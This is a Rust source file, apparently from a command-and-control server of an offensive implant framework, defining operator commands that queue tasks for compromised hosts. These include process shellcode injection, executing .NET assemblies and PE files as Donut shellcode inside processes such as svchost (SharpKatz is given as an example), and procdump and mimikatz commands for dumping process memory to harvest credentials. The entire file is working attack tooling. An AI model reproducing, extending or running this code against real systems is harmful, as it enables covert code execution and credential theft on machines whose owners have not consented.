use actix_web::web;
use server::links::Links;

// internal packages
use crate::server;
use crate::util;

pub fn link_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 2 {
        println!("link-inject <pid> \n   eg: link-inject 1307");
        return;
    }
    if std::fs::metadata("./link.bin").is_err() {
        println!("generate links first");
        println!("there must be link.bin in the current directory");
        return;
    }
    let shellcode = match std::fs::read("link.bin") {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(shellcode) => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[0] = "inject".to_string();
    updated_command.push(shellcode_b64);
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn process_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("inject <pid> <path-to-shellcode>\n   eg: inject 1307 /tmp/shellcode.bin");
        return;
    }
    let shellcode = match std::fs::read(command[2].clone()) {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(shellcode) => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[2] = shellcode_b64;
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn execute_shellcode(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("execute-shellcode <process> <path-to-shellcode> <parameters>\n   eg: execute-shellcode svchost /tmp/shellcode.bin");
        return;
    }
    let shellcode = match std::fs::read(command[2].clone()) {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(shellcode) => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[2] = shellcode_b64;
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn execute_assembly(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("execute-assembly <process> <path-to-assewmbly> <optional parameters>\n   eg: execute-assembly svchost SharpKatz.exe -h");
        return;
    }
    let parameters: Vec<String>;
    if command.len() > 3 {
        parameters = command.clone().split_off(3);
    } else {
        parameters = Vec::new();
    }
    let shellcode_b64 = match util::donut::create_shellcode(command[2].clone(), parameters) {
        Some(b64) => b64,
        None => {
            println!("Could not generate shellcode");
            return;
        },
    };
    let updated_command = vec![
        "execute-shellcode".to_string(),
        command[1].clone(),
        shellcode_b64
    ];
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn execute_pe(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("execute-pe <process> <path-to-pe> <optional parameters>\n   eg: execute-pe svchost whoami.exe");
        return;
    }
    let parameters: Vec<String>;
    if command.len() > 3 {
        parameters = command.clone().split_off(3);
    } else {
        parameters = Vec::new();
    }
    let shellcode_b64 = match util::donut::create_shellcode(command[2].clone(), parameters) {
        Some(b64) => b64,
        None => {
            println!("Could not generate shellcode");
            return;
        },
    };
    let updated_command = vec![
        "execute-shellcode".to_string(),
        command[1].clone(),
        shellcode_b64
    ];
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn procdump(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 2 {
        println!("procpdump <pid>\n   eg: procdump 1473");
        return;
    }
    let mut updated_command = command.clone();
    if command[0] == "mimikatz".to_string() {
        updated_command[0] = "procdump".to_string();
    }
    updated_command[1] = command[1].clone();
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn mimikatz(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() > 1 {
        println!("mimikatz\n   eg: mimikatz");
        return;
    }
    let updated_command = vec!["mimikatz".to_string(), "0".to_string()];
    procdump(links, link_index, updated_command);
}
